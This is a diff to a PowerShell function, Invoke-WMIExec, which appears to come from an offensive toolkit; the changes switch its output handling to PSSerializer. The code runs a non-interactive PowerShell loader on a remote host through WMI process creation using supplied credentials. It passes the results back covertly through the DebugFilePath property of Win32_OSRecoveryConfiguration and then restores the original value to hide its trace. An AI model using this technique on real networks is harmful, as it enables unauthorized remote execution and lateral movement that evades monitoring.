@@ -436,8 +436,8 @@ function Local:Invoke-WMIExec {
             Write-Verbose "[WMIEXEC] Encoding payload into WMI property DebugFilePath"
             $script = ''
             $script += '[ScriptBlock] $ScriptBlock = {' + $ScriptBlock.Ast.Extent.Text + '}' + [Environment]::NewLine -replace '{{','{' -replace '}}','}'
-            $script += '$output = & $ScriptBlock *>&1 | Out-String' + [Environment]::NewLine
-            $script += 'if (-not $output) { $output = "No output." }' + [Environment]::NewLine
+            $script += '$output = [Management.Automation.PSSerializer]::Serialize((& $ScriptBlock *>&1))' + [Environment]::NewLine
+            #$script += 'if (-not $output) { $output = [Management.Automation.PSSerializer]::Serialize(("No output.")) }' + [Environment]::NewLine
             $script += '$encOutput = [Int[]][Char[]]$output.Trim() -Join '',''' + [Environment]::NewLine
             $script += '$x = Get-WmiObject -Class Win32_OSRecoveryConfiguration' + [Environment]::NewLine
             $script += '$x.DebugFilePath = $encOutput' + [Environment]::NewLine
@@ -458,7 +458,7 @@ function Local:Invoke-WMIExec {
         $loader += '& $z'
         $command = 'powershell -NoP -NonI -C "' + $loader + '"'
         Write-Verbose "[WMIEXEC] Running command: $command"    
-        $Process = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $command -ComputerName $ComputerName -Credential $Credential -EnableAllPrivileges $true
+        $Process = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $command -ComputerName $ComputerName -Credential $Credential
         $ProcessId = $Process.ProcessId
         do {
             Get-WmiObject -Class Win32_process -Filter "ProcessId='$ProcessId'" -ComputerName $ComputerName -Credential $Credential | Out-Null
@@ -470,7 +470,7 @@ function Local:Invoke-WMIExec {
         Write-Verbose "[WMIEXEC] Getting output from WMI property DebugFilePath"
         $modifiedObject = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential
         $output = [char[]][int[]]$modifiedObject.DebugFilePath.Split(',') -Join ''
-        Write-Output $output
+        Write-Output ([System.Management.Automation.PSSerializer]::Deserialize($output))
 
         Write-Verbose "[WMIEXEC] Restoring original WMI property value: $originalProperty"
         $modifiedObject.DebugFilePath = $originalProperty
